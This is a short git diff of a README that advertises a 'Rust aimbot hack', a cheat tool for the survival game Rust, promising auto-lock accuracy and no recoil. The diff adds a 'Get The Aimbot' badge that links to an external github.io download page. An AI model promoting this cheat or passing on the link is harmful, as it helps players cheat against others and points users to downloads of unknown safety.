@@ -4,7 +4,7 @@
 
 In the brutal survival world of **Rust**, one clean headshot can decide whether you win a raid or lose everything. That’s why many players rely on the **Rust aimbot hack** – a tool that delivers flawless accuracy, auto-lock precision, and recoil-free gunfights. This guide explains how aimbots work in Rust and why they’re the most popular PvP cheat in the game.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Aimbot-blueviolet)](https://rust-aimbot-tool.github.io/.github/)
 ---
 
 ## Product Description
